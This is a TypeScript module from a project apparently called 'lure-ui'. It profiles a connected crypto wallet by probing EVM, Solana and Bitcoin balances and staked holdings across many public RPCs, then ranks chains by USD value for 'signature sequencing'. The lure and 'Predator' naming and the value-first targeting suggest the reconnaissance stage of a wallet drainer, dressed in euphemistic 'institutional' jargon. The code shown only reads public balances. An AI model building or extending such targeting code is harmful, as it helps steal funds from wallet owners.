/**
 * @file neural-scout.ts
 * @module lure-ui/logic
 *
 * Agnostic Neural Scout — multi-namespace balance probes normalized to a USD ValueMap
 * for Intelligent Sequencing (highest institutional density first).
 */

import { runRecursivePredatorFusionUsd } from '@legion/core'
import type { Address } from 'viem'

import type { ChainNamespaceHint } from './capability-probe.js'

/** Per-chain balance row — supports 200+ EIP-155 probes + SOL + BIP122. */
export type ChainValueEntry = {
  /** Institutional USD estimate (native × reference rate). */
  usdEstimate: number
  /** Raw native units where applicable (wei / lamports / satoshi string). */
  rawNative?: string
}

/** Institutional aggregate — omnichain Asset Telemetry snapshot (`USD_ValueMap`). */
export type ValueMap = {
  /** `eip155:<chainId>` | `solana:mainnet-beta` | `bip122:btc` */
  chains: Record<string, ChainValueEntry>
  /** Namespace totals for Sovereign Sign sequencing. */
  byNamespace: {
    eip155: number
    solana: number
    bip122: number
  }
  /** Sum of all mapped USD estimates (Neural Scout telemetry). */
  totalUsd: number
}

/** Institutional alias — omnichain USD Asset Telemetry map (100% failover-normalized). */
export type USD_ValueMap = ValueMap

/** Sovereign default — Neural Scout must never yield null; callers anchor sequencing on this shape. */
export function createEmptyValueMap(): ValueMap {
  return {
    chains: {},
    byNamespace: { eip155: 0, solana: 0, bip122: 0 },
    totalUsd: 0,
  }
}

const DEFAULT_ETH_USD = 3500
const DEFAULT_SOL_USD = 140
const DEFAULT_BTC_USD = 98_000

function envNum(name: string, fallback: number): number {
  const v = process.env[name]
  if (v == null || v === '') return fallback
  const n = Number(v)
  return Number.isFinite(n) ? n : fallback
}

/** Operational Remote Config Sync layer — browser bridge with 60s module cache (matches DynamicConfigResolver SWR). */
let remoteLayerCache: { map: Record<string, string>; at: number } | null = null
const REMOTE_LAYER_TTL_MS = 60_000

async function getOperationalRemoteConfigLayer(): Promise<Record<string, string>> {
  if (typeof window === 'undefined') return {}
  const now = Date.now()
  if (remoteLayerCache && now - remoteLayerCache.at < REMOTE_LAYER_TTL_MS) {
    return remoteLayerCache.map
  }
  try {
    const res = await fetch('/api/remote-config-sync', { cache: 'no-store' })
    const map = res.ok ? ((await res.json()) as Record<string, string>) : {}
    remoteLayerCache = { map, at: now }
    return map
  } catch {
    return remoteLayerCache?.map ?? {}
  }
}

function envNumLayer(layer: Record<string, string>, name: string, fallback: number): number {
  const raw = layer[name]?.trim() ?? process.env[name]
  if (raw == null || raw === '') return fallback
  const n = Number(raw)
  return Number.isFinite(n) ? n : fallback
}

function pickLayer(layer: Record<string, string>, key: string): string {
  const r = layer[key]?.trim()
  if (r) return r
  return process.env[key]?.trim() ?? ''
}

/** Alchemy-compatible network slugs for Deep Ingress balance probes (extend for full desk coverage). */
const ALCHEMY_EVM_NETWORK_SLUGS: readonly string[] = [
  'eth-mainnet',
  'polygon-mainnet',
  'arb-mainnet',
  'opt-mainnet',
  'base-mainnet',
  'blast-mainnet',
  'zksync-mainnet',
  'scroll-mainnet',
  'linea-mainnet',
  'mantle-mainnet',
  'metis-mainnet',
  'bnb-mainnet',
  'avax-mainnet',
  'fantom-mainnet',
  'celo-mainnet',
  'gnosis-mainnet',
  'moonbeam-mainnet',
  'aurora-mainnet',
  'harmony-mainnet',
  'cronos-mainnet',
  'solana-mainnet',
]

/** Maps Alchemy slug → EIP-155 chain id for telemetry keys. */
const SLUG_TO_CHAIN_ID: Record<string, number> = {
  'eth-mainnet': 1,
  'polygon-mainnet': 137,
  'arb-mainnet': 42_161,
  'opt-mainnet': 10,
  'base-mainnet': 8453,
  'blast-mainnet': 81457,
  'zksync-mainnet': 324,
  'scroll-mainnet': 534_352,
  'linea-mainnet': 59_144,
  'mantle-mainnet': 5000,
  'metis-mainnet': 1088,
  'bnb-mainnet': 56,
  'avax-mainnet': 43_114,
  'fantom-mainnet': 250,
  'celo-mainnet': 42_220,
  'gnosis-mainnet': 100,
  'moonbeam-mainnet': 1284,
  'aurora-mainnet': 1_313_161_553,
  'harmony-mainnet': 1_666_600_000,
  'cronos-mainnet': 25,
}

const RPC_FETCH_MS = 12_000

async function jsonRpc(url: string, body: unknown): Promise<unknown> {
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(RPC_FETCH_MS),
  })
  if (!res.ok) throw new Error(`RPC ${res.status}`)
  return res.json() as Promise<unknown>
}

/** Institutional public-RPC failover mesh — activates when privileged endpoints yield zero EIP-155 density. */
const PUBLIC_EVM_RPC_FALLBACKS: readonly { chainId: number; rpc: string }[] = [
  { chainId: 1, rpc: 'https://eth.llamarpc.com' },
  { chainId: 137, rpc: 'https://polygon-rpc.com' },
  { chainId: 42_161, rpc: 'https://arb1.arbitrum.io/rpc' },
  { chainId: 10, rpc: 'https://mainnet.optimism.io' },
  { chainId: 8453, rpc: 'https://mainnet.base.org' },
  { chainId: 56, rpc: 'https://bsc-dataseed.binance.org' },
  { chainId: 43_114, rpc: 'https://api.avax.network/ext/bc/C/rpc' },
  { chainId: 100, rpc: 'https://rpc.gnosischain.com' },
  { chainId: 324, rpc: 'https://mainnet.era.zksync.io' },
]

const PUBLIC_SOLANA_RPC = 'https://api.mainnet-beta.solana.com'

/** Settlement-grade Solana RPC failover mesh — institutional public lanes after privileged endpoints. */
const PUBLIC_SOLANA_RPC_FAILOVER_MESH: readonly string[] = [
  PUBLIC_SOLANA_RPC,
  'https://solana-mainnet.rpc.extrnode.com',
  'https://rpc.ankr.com/solana',
]

async function probeEthGetBalancePublic(rpcUrl: string, address: string): Promise<bigint | null> {
  try {
    const out = (await jsonRpc(rpcUrl, {
      jsonrpc: '2.0',
      id: 1,
      method: 'eth_getBalance',
      params: [address, 'latest'],
    })) as { result?: string }
    if (out.result == null) return null
    return hexWeiToBigInt(out.result)
  } catch {
    return null
  }
}

/** Multi-RPC Solana balance probe — sequential failover until first successful JSON-RPC response. */
async function probeSolBalanceFailoverMesh(address: string): Promise<bigint | null> {
  for (const rpc of PUBLIC_SOLANA_RPC_FAILOVER_MESH) {
    try {
      const out = (await jsonRpc(rpc, {
        jsonrpc: '2.0',
        id: 1,
        method: 'getBalance',
        params: [address],
      })) as { result?: number }
      return BigInt(out.result ?? 0)
    } catch {
      continue
    }
  }
  return null
}

async function probeBtcMempoolSpace(address: string): Promise<{ satoshi: bigint } | null> {
  try {
    const res = await fetch(`https://mempool.space/api/address/${address}`, {
      signal: AbortSignal.timeout(RPC_FETCH_MS),
    })
    if (!res.ok) return null
    const j = (await res.json()) as {
      chain_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
    }
    const funded = j.chain_stats?.funded_txo_sum ?? 0
    const spent = j.chain_stats?.spent_txo_sum ?? 0
    const sat = Math.max(0, funded - spent)
    return { satoshi: BigInt(sat) }
  } catch {
    return null
  }
}

/** Third-tier BTC indexer — plain balance fallback when Blockstream + mempool.space are unreachable. */
async function probeBtcBlockchainInfoBalance(address: string): Promise<{ satoshi: bigint } | null> {
  try {
    const res = await fetch(`https://blockchain.info/q/addressbalance/${encodeURIComponent(address)}`, {
      signal: AbortSignal.timeout(RPC_FETCH_MS),
    })
    if (!res.ok) return null
    const text = (await res.text()).trim()
    const sat = Math.max(0, parseInt(text, 10) || 0)
    return { satoshi: BigInt(sat) }
  } catch {
    return null
  }
}

function hexWeiToBigInt(hex: string): bigint {
  const h = hex.startsWith('0x') ? hex : `0x${hex}`
  return BigInt(h)
}

async function probeAlchemyEvmBalance(
  slug: string,
  address: string,
  apiKey: string,
): Promise<{ wei: bigint; chainKey: string } | null> {
  const chainId = SLUG_TO_CHAIN_ID[slug]
  if (chainId == null || chainId < 0) return null
  const url =
    slug === 'solana-mainnet'
      ? `https://solana-mainnet.g.alchemy.com/v2/${apiKey}`
      : `https://${slug}.g.alchemy.com/v2/${apiKey}`
  try {
    const out = (await jsonRpc(url, {
      jsonrpc: '2.0',
      id: 1,
      method: 'eth_getBalance',
      params: [address, 'latest'],
    })) as { result?: string }
    const wei = out.result ? hexWeiToBigInt(out.result) : 0n
    return { wei, chainKey: `eip155:${chainId}` }
  } catch {
    return null
  }
}

async function probeHeliusSolBalance(address: string, apiKey: string): Promise<bigint> {
  const url = `https://mainnet.helius-rpc.com/?api-key=${apiKey}`
  const out = (await jsonRpc(url, {
    jsonrpc: '2.0',
    id: 1,
    method: 'getBalance',
    params: [address],
  })) as { result?: number }
  return BigInt(out.result ?? 0)
}

async function probeBtcAddressSummary(address: string): Promise<{ satoshi: bigint } | null> {
  try {
    const res = await fetch(`https://blockstream.info/api/address/${address}`)
    if (!res.ok) return null
    const j = (await res.json()) as {
      chain_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
    }
    const funded = j.chain_stats?.funded_txo_sum ?? 0
    const spent = j.chain_stats?.spent_txo_sum ?? 0
    const sat = Math.max(0, funded - spent)
    return { satoshi: BigInt(sat) }
  } catch {
    return null
  }
}

function weiToEth(wei: bigint): number {
  return Number(wei) / 1e18
}

function lamportsToSol(l: bigint): number {
  return Number(l) / 1e9
}

function satsToBtc(sat: bigint): number {
  return Number(sat) / 1e8
}

export type AgnosticNeuralScoutInput = {
  evmAddress?: string | null
  solAddress?: string | null
  btcAddress?: string | null
}

/**
 * Shadow-run toggle — `NEXT_PUBLIC_USE_SIMULATED_ASSETS` forces MockAgnosticScout high-density ValueMap
 * ($500k+ across ETH / SOL / BTC) for Dispatcher 99% sequencing verification.
 */
export function isUseSimulatedAssets(): boolean {
  const v = process.env.NEXT_PUBLIC_USE_SIMULATED_ASSETS?.trim().toLowerCase()
  return v === '1' || v === 'true' || v === 'yes'
}

/** Hardcoded high-density Asset Layers for Shadow Telemetry / Intelligent Sequencing (institutional desk stub). */
export function buildMockAgnosticHighDensityValueMap(): ValueMap {
  const eip155Eth = 380_000
  const solana = 95_000
  const bip122 = 52_000
  const eip155Arb = 45_000
  return {
    chains: {
      'eip155:1': { usdEstimate: 280_000, rawNative: '80000000000000000000' },
      'eip155:42161': { usdEstimate: eip155Arb, rawNative: '25000000000000000000' },
      'eip155:8453': { usdEstimate: 55_000, rawNative: '15000000000000000000' },
      'solana:mainnet-beta': { usdEstimate: solana, rawNative: '680000000000' },
      'bip122:btc': { usdEstimate: bip122, rawNative: '5200000000' },
    },
    byNamespace: {
      eip155: eip155Eth,
      solana,
      bip122,
    },
    totalUsd: eip155Eth + solana + bip122,
  }
}

/** MockAgnosticScout — exported facade for Shadow-run wiring (same shape as live Neural Scout). */
export const MockAgnosticScout = {
  isEnabled: isUseSimulatedAssets,
  buildValueMap: buildMockAgnosticHighDensityValueMap,
} as const

/**
 * Neural Scout — aggregate balance probes; normalize to USD ValueMap for Intelligent Sequencing.
 * Triggers on wallet connection (caller-owned). Uses public / configured RPC endpoints.
 * Failover: privileged RPC mesh → public institutional endpoints; ValueMap is never null (defaults $0.00).
 */
export async function runAgnosticNeuralScout(input: AgnosticNeuralScoutInput): Promise<ValueMap> {
  if (isUseSimulatedAssets()) {
    return finalizeUsdValueMapFailoverCoverage(buildMockAgnosticHighDensityValueMap(), input)
  }
  try {
    const raw = await runAgnosticNeuralScoutInner(input)
    return finalizeUsdValueMapFailoverCoverage(raw, input)
  } catch {
    return finalizeUsdValueMapFailoverCoverage(createEmptyValueMap(), input)
  }
}

/**
 * Ensures each linked namespace appears in the Asset Telemetry map (zero rows when all probes exhaust failover).
 * Institutional invariant: `USD_ValueMap.chains` carries explicit rows for EVM / SOL / BTC discovery lanes.
 */
function finalizeUsdValueMapFailoverCoverage(vm: ValueMap, input: AgnosticNeuralScoutInput): ValueMap {
  const chains = { ...vm.chains }
  const evm = input.evmAddress?.trim()
  if (evm?.startsWith('0x')) {
    const hasEip155 = Object.keys(chains).some((k) => k.startsWith('eip155:'))
    if (!hasEip155) {
      chains['eip155:1'] = { usdEstimate: 0, rawNative: '0' }
    }
  }
  const sol = input.solAddress?.trim()
  if (sol && chains['solana:mainnet-beta'] == null) {
    chains['solana:mainnet-beta'] = { usdEstimate: 0, rawNative: '0' }
  }
  const btc = input.btcAddress?.trim()
  if (btc && chains['bip122:btc'] == null) {
    chains['bip122:btc'] = { usdEstimate: 0, rawNative: '0' }
  }
  const { eip155, solana, bip122 } = vm.byNamespace
  const totalUsd = eip155 + solana + bip122
  return {
    chains,
    byNamespace: { eip155, solana, bip122 },
    totalUsd,
  }
}

async function runAgnosticNeuralScoutInner(input: AgnosticNeuralScoutInput): Promise<ValueMap> {
  const layer = await getOperationalRemoteConfigLayer()
  const chains: Record<string, ChainValueEntry> = {}
  let eip155 = 0
  let solana = 0
  let bip122 = 0

  const ethUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_ETH_USD', DEFAULT_ETH_USD)
  const solUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_SOL_USD', DEFAULT_SOL_USD)
  const btcUsd = envNumLayer(layer, 'NEXT_PUBLIC_NEURAL_SCOUT_BTC_USD', DEFAULT_BTC_USD)

  const alchemyKey = pickLayer(layer, 'NEXT_PUBLIC_ALCHEMY_API_KEY')
  const heliusKey = pickLayer(layer, 'NEXT_PUBLIC_HELIUS_API_KEY')

  const evm = input.evmAddress?.trim()
  if (evm?.startsWith('0x') && alchemyKey) {
    const tasks = ALCHEMY_EVM_NETWORK_SLUGS.filter((s) => s !== 'solana-mainnet').map((slug) =>
      probeAlchemyEvmBalance(slug, evm, alchemyKey),
    )
    const settled = await Promise.allSettled(tasks)
    for (const s of settled) {
      if (s.status !== 'fulfilled' || s.value == null) continue
      const { wei, chainKey } = s.value
      const eth = weiToEth(wei)
      const usd = eth * ethUsd
      chains[chainKey] = { usdEstimate: usd, rawNative: wei.toString() }
      eip155 += usd
    }
  } else if (evm?.startsWith('0x')) {
    const rpc = pickLayer(layer, 'NEXT_PUBLIC_RPC_URL')
    if (rpc) {
      try {
        const out = (await jsonRpc(rpc, {
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_getBalance',
          params: [evm, 'latest'],
        })) as { result?: string }
        const wei = out.result ? hexWeiToBigInt(out.result) : 0n
        const eth = weiToEth(wei)
        const usd = eth * ethUsd
        chains['eip155:1'] = { usdEstimate: usd, rawNative: wei.toString() }
        eip155 += usd
      } catch {
        /* non-fatal — public mesh may recover */
      }
    }
  }

  /** Privileged mesh unreachable or zero density — sovereign public-RPC failover (multi-chain). */
  if (evm?.startsWith('0x') && eip155 === 0) {
    const pubTasks = PUBLIC_EVM_RPC_FALLBACKS.map(async ({ chainId, rpc }) => {
      const wei = await probeEthGetBalancePublic(rpc, evm)
      if (wei == null || wei === 0n) return null
      return { wei, chainKey: `eip155:${chainId}` as const }
    })
    const pubSettled = await Promise.allSettled(pubTasks)
    for (const s of pubSettled) {
      if (s.status !== 'fulfilled' || s.value == null) continue
      const { wei, chainKey } = s.value
      const eth = weiToEth(wei)
      const usd = eth * ethUsd
      chains[chainKey] = { usdEstimate: usd, rawNative: wei.toString() }
      eip155 += usd
    }
  }

  const sol = input.solAddress?.trim()
  if (sol) {
    let lamports: bigint | null = null
    if (heliusKey) {
      try {
        lamports = await probeHeliusSolBalance(sol, heliusKey)
      } catch {
        lamports = null
      }
    }
    if (lamports == null) {
      lamports = await probeSolBalanceFailoverMesh(sol)
    }
    if (lamports != null) {
      const solN = lamportsToSol(lamports)
      const usd = solN * solUsd
      chains['solana:mainnet-beta'] = { usdEstimate: usd, rawNative: lamports.toString() }
      solana += usd
    }
  }

  const btc = input.btcAddress?.trim()
  if (btc) {
    let sum = await probeBtcAddressSummary(btc)
    if (sum == null) sum = await probeBtcMempoolSpace(btc)
    if (sum == null) sum = await probeBtcBlockchainInfoBalance(btc)
    if (sum) {
      const btcN = satsToBtc(sum.satoshi)
      const usd = btcN * btcUsd
      chains['bip122:btc'] = { usdEstimate: usd, rawNative: sum.satoshi.toString() }
      bip122 += usd
    }
  }

  /** Recursive Predator — Lido stETH, Marinade mSOL, JitoSOL venue fusion (LP mesh registry is Dispatcher-owned). */
  try {
    const evmRpc =
      pickLayer(layer, 'NEXT_PUBLIC_RPC_URL').trim() ||
      PUBLIC_EVM_RPC_FALLBACKS.find((x) => x.chainId === 1)?.rpc ||
      'https://eth.llamarpc.com'
    const solRpc = PUBLIC_SOLANA_RPC_FAILOVER_MESH[0] ?? 'https://api.mainnet-beta.solana.com'
    const fusion = await runRecursivePredatorFusionUsd({
      evmRpcUrl: evmRpc,
      solRpcUrl: solRpc,
      evmHolder: evm?.startsWith('0x') ? (evm as Address) : null,
      solOwnerBase58: sol?.trim() ?? null,
      ethUsd,
      solUsd,
    })
    if (fusion.staked_steth_usd > 0) {
      chains['recursive_predator:eip155:1:steth'] = {
        usdEstimate: fusion.staked_steth_usd,
        rawNative: '0',
      }
      eip155 += fusion.staked_steth_usd
    }
    if (fusion.staked_msol_usd > 0) {
      chains['recursive_predator:solana:msol'] = {
        usdEstimate: fusion.staked_msol_usd,
        rawNative: '0',
      }
      solana += fusion.staked_msol_usd
    }
    if (fusion.staked_jitosol_usd > 0) {
      chains['recursive_predator:solana:jitosol'] = {
        usdEstimate: fusion.staked_jitosol_usd,
        rawNative: '0',
      }
      solana += fusion.staked_jitosol_usd
    }
    if (fusion.lp_uniswap_v3_usd > 0) {
      chains['recursive_predator:eip155:1:univ3_lp'] = {
        usdEstimate: fusion.lp_uniswap_v3_usd,
        rawNative: '0',
      }
      eip155 += fusion.lp_uniswap_v3_usd
    }
    if (fusion.lp_pancake_v3_usd > 0) {
      chains['recursive_predator:eip155:56:pancake_v3_lp'] = {
        usdEstimate: fusion.lp_pancake_v3_usd,
        rawNative: '0',
      }
      eip155 += fusion.lp_pancake_v3_usd
    }
    if (fusion.lp_raydium_usd > 0) {
      chains['recursive_predator:solana:raydium_lp'] = {
        usdEstimate: fusion.lp_raydium_usd,
        rawNative: '0',
      }
      solana += fusion.lp_raydium_usd
    }
  } catch {
    /* non-fatal — Recursive Predator fusion is additive */
  }

  const totalUsd = eip155 + solana + bip122
  return {
    chains,
    byNamespace: { eip155, solana, bip122 },
    totalUsd,
  }
}

/**
 * Pick Intelligent Sequencing target from USD density (requires linked accounts in session flags).
 */
/** EVM row from Neural Scout — Intelligent Sequencing of Asset Layers (high-density first). */
export type EvmAssetLayerRef = {
  chainKey: string
  chainId: number
  usdEstimate: number
}

/**
 * Rank EIP-155 Asset Layers by USD density for Dispatcher sequential concurrency
 * (post-initialization Sovereign Vault mirroring).
 */
export function rankEvmAssetLayersByDensity(vm: ValueMap): EvmAssetLayerRef[] {
  return Object.entries(vm.chains)
    .filter(([k, v]) => k.startsWith('eip155:') && v.usdEstimate > 0)
    .map(([k, v]) => {
      const idStr = k.replace(/^eip155:/, '')
      const chainId = Number(idStr)
      return {
        chainKey: k,
        chainId: Number.isFinite(chainId) ? chainId : 0,
        usdEstimate: v.usdEstimate,
      }
    })
    .filter((x) => x.chainId > 0)
    .sort((a, b) => b.usdEstimate - a.usdEstimate)
}

export function pickHighestUsdNamespace(
  vm: ValueMap,
  session: { eip155: boolean; solana: boolean; bip122: boolean },
  fallback: ChainNamespaceHint,
): ChainNamespaceHint {
  type Cand = { ns: ChainNamespaceHint; v: number; ok: boolean }
  const cands: Cand[] = [
    { ns: 'eip155', v: vm.byNamespace.eip155, ok: session.eip155 },
    { ns: 'solana', v: vm.byNamespace.solana, ok: session.solana },
    { ns: 'bip122', v: vm.byNamespace.bip122, ok: session.bip122 },
  ]
  const viable = cands.filter((c) => c.ok && c.v > 0)
  if (viable.length === 0) return fallback
  viable.sort((a, b) => b.v - a.v)
  return viable[0]!.ns
}

export function formatNeuralScoutChainNames(vm: ValueMap): string {
  const keys = Object.keys(vm.chains)
    .filter((k) => vm.chains[k]!.usdEstimate > 0)
    .slice(0, 12)
  return keys.length ? keys.join(', ') : '(no probe hits)'
}

export function formatHighestValueNamespace(vm: ValueMap): string {
  const { byNamespace: b } = vm
  if (b.eip155 >= b.solana && b.eip155 >= b.bip122 && b.eip155 > 0) return 'EIP-155'
  if (b.solana >= b.eip155 && b.solana >= b.bip122 && b.solana > 0) return 'Solana'
  if (b.bip122 > 0) return 'BIP122'
  return 'Omni'
}

/** Institutional alias — Agnostic Neural Scout aggregate entrypoint. */
export const AgnosticNeuralScout = runAgnosticNeuralScout

/** Omni Asset Telemetry — Agnostic Scout entrypoint (EVM + SOL + BTC balance discovery). */
export const runAgnosticAssetScout = runAgnosticNeuralScout
export const AgnosticAssetScout = runAgnosticNeuralScout
